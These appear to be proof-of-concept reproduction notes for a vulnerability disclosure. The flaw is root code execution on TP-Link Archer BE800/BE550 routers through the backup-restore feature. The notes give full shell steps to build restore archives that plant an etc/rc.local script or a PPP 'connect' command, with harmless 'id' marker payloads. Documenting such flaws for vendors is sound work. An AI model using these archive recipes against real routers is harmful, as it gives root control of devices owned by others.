# PoC Reproduction Notes

## Scope

These PoCs are benign local semantic verifiers for the TP-Link Archer BE800/BE550 unsafe restore primitive and its PPP execution sink. They do not require a real router and do not modify the host outside a temporary working directory.

The scripts demonstrate:

- A crafted backup archive containing `etc/rc.local` is extracted as a rootfs-relative file when the firmware restore command semantics are applied.
- A crafted backup archive containing `etc/config/network` can carry a PPP `connect` command.
- The TP-Link PPP protocol script passes the restored `connect` value to `/usr/sbin/pppd`.

## Local Verifiers

Run from the repository root in a shell with `tar`, `sed`, and `sh`:

```sh
sh cve_submission_materials/tplink_be800_be550_restore_rootfs_rce_2026_06_16/poc/verify_tplink_be_restore_rc_local_rce_chain_2026_06_16.sh
sh cve_submission_materials/tplink_be800_be550_restore_rootfs_rce_2026_06_16/poc/verify_tplink_be_restore_ppp_connect_rce_chain_2026_06_16.sh
sh cve_submission_materials/tplink_be800_be550_restore_rootfs_rce_2026_06_16/poc/verify_tplink_be_restore_ppp_connect_rce_chain_2026_06_16.sh gpl_focus/GPL_Archer_BE550v2.6_BE9300v2.6/qca_95xx_12_2/package/network/services/ppp/files/ppp.sh
```

Existing captured outputs:

- `evidence/verify_rc_local_output.txt`
- `evidence/verify_ppp_be800_output.txt`
- `evidence/verify_ppp_be550_output.txt`

## Manual Restore Archive Shape

### `/etc/rc.local` marker payload

```sh
mkdir -p poc/etc
cat > poc/etc/rc.local <<'EOF'
#!/bin/sh
id > /tmp/tplink_be_restore_rc_local_poc
EOF
chmod 0755 poc/etc/rc.local
tar -czf restore_rc_local_poc.tgz -C poc etc/rc.local
```

Upload `restore_rc_local_poc.tgz` through the authenticated web backup/restore feature. After restore and reboot, a vulnerable device is expected to execute `/etc/rc.local` as root and create:

```text
/tmp/tplink_be_restore_rc_local_poc
```

### PPP `connect` marker payload

```sh
mkdir -p poc/etc/config
cat > poc/etc/config/network <<'EOF'
config interface 'pocppp'
	option proto 'ppp'
	option device '/dev/null'
	option username 'poc'
	option password 'poc'
	option connect 'id > /tmp/tplink_be_ppp_connect_poc'
EOF
tar -czf restore_ppp_connect_poc.tgz -C poc etc/config/network
```

Upload `restore_ppp_connect_poc.tgz` through the authenticated web backup/restore feature. The restored interface must then be brought up by network restart, reboot, LuCI apply, or:

```sh
/sbin/ifup pocppp
```

The expected marker is:

```text
/tmp/tplink_be_ppp_connect_poc
```

The PPP chain remains a conditional source/harness-verified path until real-device or QEMU runtime proof is added.

## Production Device Evidence To Add

For a complete vendor/CNA submission, capture:

- Authenticated HTTP request/response for the backup restore upload.
- Screenshot or terminal capture showing the firmware version.
- Reboot or service trigger step.
- Marker file content from `/tmp/*_poc`.
- System log evidence, if available.

Use harmless marker commands such as `id > /tmp/...` or `echo POC > /tmp/...`; do not deploy network payloads on third-party devices.
